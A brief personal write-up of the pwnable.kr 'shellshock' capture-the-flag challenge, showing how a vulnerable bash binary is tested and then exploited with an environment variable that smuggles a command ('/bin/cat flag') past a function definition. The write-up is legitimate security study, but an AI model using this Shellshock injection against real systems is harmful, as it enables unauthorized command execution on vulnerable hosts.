---
title: Pwnable.kr Shellshock
date: 2022-08-20T14:06:14+02:00
tags: ['cs/security']
aliases: ['']
---

This challenge has a bash executable in the home directory which the shellshock
executable runs like below:

```c
system("/home/shellshock/bash -c 'echo shock_me'");
```

The bash binary is vulnerable to [[notes/Shellshock | shellshock]] as can be seen by the following
command:


```bash
env x='() { :;}; echo vulnerable' ./bash -c 'echo hello'
```

Since the binary simply calls the bash binary, we can the command below to run
the flag:

```bash
env x='() { :;}; /bin/cat flag' ./shellshock
```
